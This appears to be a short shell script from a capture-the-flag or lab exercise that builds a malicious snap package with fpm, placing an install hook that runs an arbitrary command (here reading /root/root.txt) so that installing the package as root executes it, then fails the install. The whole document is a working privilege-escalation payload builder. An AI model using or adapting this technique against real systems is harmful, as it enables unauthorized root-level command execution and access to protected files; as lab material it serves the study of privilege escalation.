set -eu

COMMAND='cat /root/root.txt'
cd .build
rm xxxx_1.0_all.snap
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
